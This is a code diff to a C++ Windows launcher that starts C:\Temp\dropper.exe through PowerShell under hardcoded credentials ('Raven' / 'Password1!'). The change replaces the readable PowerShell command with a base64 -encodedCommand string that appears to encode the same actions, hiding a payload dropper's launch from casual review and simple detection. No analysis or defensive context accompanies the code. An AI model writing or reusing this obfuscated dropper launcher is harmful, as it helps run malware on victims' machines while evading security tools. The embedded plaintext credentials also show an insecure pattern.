@@ -67,13 +67,15 @@ int wmain()
     si.cb = sizeof(si);
     ZeroMemory(&pi, sizeof(pi));
 
-    std::wstring cmd = 
-        L"powershell.exe -Command "
-        L"$username = 'Raven'; "
-        L"$password = 'Password1!'; "
-        L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
-        L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
-        L"Start-Process C:\\Temp\\dropper.exe -Credential $credential;";
+    //std::wstring cmd = 
+    //    L"powershell.exe -Command "
+    //    L"$username = 'Raven'; "
+    //    L"$password = 'Password1!'; "
+    //    L"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
+    //    L"$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; "
+    //    L"Start-Process C:\\Temp\\dropper.exe -Credential $credential;";
+
+    std::wstring cmd = L"powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJAB1AHMAZQByAG4AYQBtAGUALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAOwA=";
 
     if (!CreateProcessW(
         NULL,
